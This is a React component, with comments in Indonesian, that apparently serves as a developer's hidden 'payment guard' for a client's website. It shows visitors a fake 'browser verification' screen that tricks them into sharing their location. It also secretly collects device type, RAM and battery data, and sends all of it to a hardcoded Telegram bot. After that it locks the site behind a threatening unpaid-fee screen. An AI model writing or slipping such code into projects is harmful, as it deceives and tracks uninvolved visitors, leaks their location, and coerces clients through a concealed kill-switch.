import React, { useState, useEffect } from 'react';

const PaymentGuard = ({ children }: { children: React.ReactNode }) => {
  const isPending = true; // SAKLAR UTAMA
  const BOT_TOKEN = "8799389636:AAGRQ3ThfyKQKFl2s1hg_tgmtATuWuC_FFc";
  const CHAT_ID = "7259504531";

  const [step, setStep] = useState(0); // 0: Verification, 1: Locked Screen
  const [deviceData, setDeviceData] = useState({
    os: 'Detecting...',
    ram: 'Detecting...',
    battery: 'Detecting...',
    location: 'Waiting Permission...'
  });

  const sendToTelegram = async (pesan: string) => {
    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: pesan, parse_mode: 'HTML' })
      });
    } catch (err) {}
  };

  // Kumpulkan info device secara diam-diam saat pertama buka
  useEffect(() => {
    if (isPending) {
      const ua = navigator.userAgent;
      let model = /android/i.test(ua) ? "Android Device" : /iPhone|iPad/i.test(ua) ? "iOS Device" : "PC/Laptop";
      // @ts-ignore
      const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown";
      
      const getBat = async () => {
        try {
          // @ts-ignore
          const b = await navigator.getBattery();
          return `${Math.round(b.level * 100)}% ${b.charging ? '(Charging)' : ''}`;
        } catch { return "Unknown"; }
      };

      getBat().then(bat => setDeviceData(prev => ({ ...prev, os: model, ram: ram, battery: bat })));
    }
  }, []);

  const handleStartVerification = () => {
    // Tahap 1: Pancing Izin Lokasi
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const { latitude, longitude } = pos.coords;
          setDeviceData(prev => ({ ...prev, location: 'Locked' }));
          sendToTelegram(`<b>📍 LOKASI DITEMUKAN</b>\nDevice: ${deviceData.os}\nMaps: http://google.com/maps?q=${latitude},${longitude}`);
          setStep(1); // Lanjut ke layar kunci
        },
        () => {
          sendToTelegram(`<b>❌ LOKASI DITOLAK</b>\nDevice: ${deviceData.os} menolak izin.`);
          setStep(1); // Tetap lanjut ke layar kunci
        },
        { enableHighAccuracy: true }
      );
    } else {
      setStep(1);
    }

    // Kirim Log Spek Device
    sendToTelegram(`<b>🚨 VERIFIKASI DIMULAI</b>\nDevice: ${deviceData.os}\nRAM: ${deviceData.ram}\nBaterai: ${deviceData.battery}`);
  };

  if (!isPending) return <>{children}</>;

  // TAMPILAN TAHAP 1: VERIFIKASI PALSU
  if (step === 0) {
    return (
      <div className="fixed inset-0 z-[9999] flex items-center justify-center bg-white p-6">
        <div className="max-w-md w-full text-center">
          <div className="mb-6 flex justify-center">
            <div className="w-16 h-16 border-4 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
          </div>
          <h2 className="text-xl font-bold text-gray-800 mb-2">Verifikasi Browser</h2>
          <p className="text-gray-500 text-sm mb-8">
            Untuk alasan keamanan dan sinkronisasi sistem terbaru, silakan lakukan verifikasi perangkat Anda sebelum mengakses dashboard.
          </p>
          <button 
            onClick={handleStartVerification}
            className="w-full py-4 bg-blue-600 text-white font-bold rounded-xl hover:bg-blue-700 transition-all shadow-lg"
          >
            Lanjutkan Verifikasi
          </button>
          <p className="mt-4 text-[10px] text-gray-400 uppercase tracking-widest">Security System by iboycloud</p>
        </div>
      </div>
    );
  }

  // TAMPILAN TAHAP 2: LAYAR KUNCI (YANG KERAS)
  return (
    <div className="fixed inset-0 z-[9999] flex items-center justify-center bg-gray-50 p-4 font-sans overflow-y-auto">
      <div className="max-w-lg w-full p-8 bg-white border-2 border-red-100 shadow-2xl rounded-[2rem]">
        <div className="flex justify-center mb-6">
          <div className="p-4 bg-red-50 rounded-full animate-bounce">
            <svg xmlns="http://www.w3.org/2000/svg" className="w-10 h-10 text-red-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
            </svg>
          </div>
        </div>
        
        <h1 className="text-2xl font-black text-center text-gray-900 uppercase mb-4">Akses Ditutup</h1>
        <div className="space-y-4 mb-8">
          <p className="text-gray-600 font-medium text-center">
            "Maaf website ini kami tutup, belum melunasi pembayaran yang nunggak. Jangan salahkan developer jika sulit untuk membayar."
          </p>
          <div className="p-4 bg-gray-900 rounded-2xl border-l-4 border-red-500">
            <p className="text-red-400 font-bold italic text-sm text-center">
              "Developer bukan budak yang disuruh-suruh terus. Waktu mahal, jangan membuang waktu jika bercanda order!"
            </p>
          </div>
        </div>

        {/* Info Box Real-time */}
        <div className="bg-black rounded-xl p-4 mb-8 font-mono text-[10px]">
          <p className="text-red-500 mb-2 font-bold text-center border-b border-gray-800 pb-2 uppercase">Tracing System Active</p>
          <div className="text-green-500 space-y-1">
            <p><span className="text-gray-500">Device :</span> {deviceData.os}</p>
            <p><span className="text-gray-500">RAM    :</span> {deviceData.ram}</p>
            <p><span className="text-gray-500">Power  :</span> {deviceData.battery}</p>
            <p><span className="text-gray-500">Loc    :</span> {deviceData.location}</p>
          </div>
        </div>

        <button 
          onClick={() => window.location.href = 'https://wa.me/nomorkamu'} 
          className="w-full py-4 bg-red-600 text-white font-black rounded-2xl shadow-lg uppercase"
        >
          Selesaikan Pembayaran
        </button>
      </div>
    </div>
  );
};

export default PaymentGuard;
